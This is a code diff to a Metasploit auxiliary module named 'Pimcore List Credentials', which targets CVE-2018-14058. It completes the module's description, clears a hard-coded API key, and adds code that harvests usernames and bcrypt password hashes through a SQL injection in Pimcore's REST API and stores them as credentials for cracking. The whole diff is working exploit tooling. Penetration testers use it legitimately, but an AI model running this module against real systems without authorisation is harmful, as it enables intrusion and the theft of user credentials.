@@ -5,12 +5,13 @@
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
+  include Msf::Auxiliary::Report
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Module name',
+      'Name'           => 'Pimcore List Credentials',
       'Description'    => %q{
-        Say something that the user might want to know.
+        This module extracts the usernames and hashed passwords of all users of the Pimcore web service by exploiting a SQL injection vulnerability in Pimcore's REST API.
       },
       'Author'         => [ 'Thongchai Silpavarangkura', # PoC
                             'N. Rai-Ngoen',              # PoC
@@ -19,7 +20,7 @@ class MetasploitModule < Msf::Auxiliary
       'License'        => MSF_LICENSE,
       'References'     => [
                             [ 'CVE', '2018-14058' ],
-                            [ 'EDB', '45208']
+                            [ 'EDB', '45208' ]
                           ],
       'DisclosureDate' => 'Aug 13, 2018'
     ))
@@ -27,7 +28,7 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         OptString.new('TARGETURI', [ true, 'The base path to pimcore', '/' ]),
-        OptString.new('APIKEY', [ true, 'The valid API key for Pimcore REST API', '77369eee2b728e0efbb2c296549aea09b91d3751c26a3c27ce0b1dbb6bfaf11b' ])
+        OptString.new('APIKEY', [ true, 'The valid API key for Pimcore REST API', '' ])
       ])
   end
 
@@ -63,12 +64,33 @@ class MetasploitModule < Msf::Auxiliary
   def format_results(response)
     fail_with(Failure::NotFound, 'No data found') unless response
     creds = response.to_s.scan(/"([^\s]*)\s(\$[^(=>)]*)"/)
-    creds.each { |user, pass| print_good("#{user} : #{pass}") }
+    fail_with(Failure::NotFound, 'Could not find any credentials') if creds.empty?
+
+    print_good("Credentials obtained:")
+    creds.each do |user, pass|
+      print_good("#{user} : #{pass}")
+      store_creds(user, pass)
+    end
+  end
+
+  def store_creds(username, hash)
+    store_valid_credential(
+      user: username,
+      private: hash,
+      private_type: :nonreplayable_hash,
+      service_data: {
+        jtr_format: 'bcrypt',
+        origin_type: :service,
+        address: rhost,
+        port: rport,
+        service_name: 'mysql',
+        protocol: 'tcp'
+      }
+    )
   end
 
   def run
     fail_with(Failure::NotFound, 'Could not access the Pimcore web page.') unless available?
-
     get_creds
   end
 end
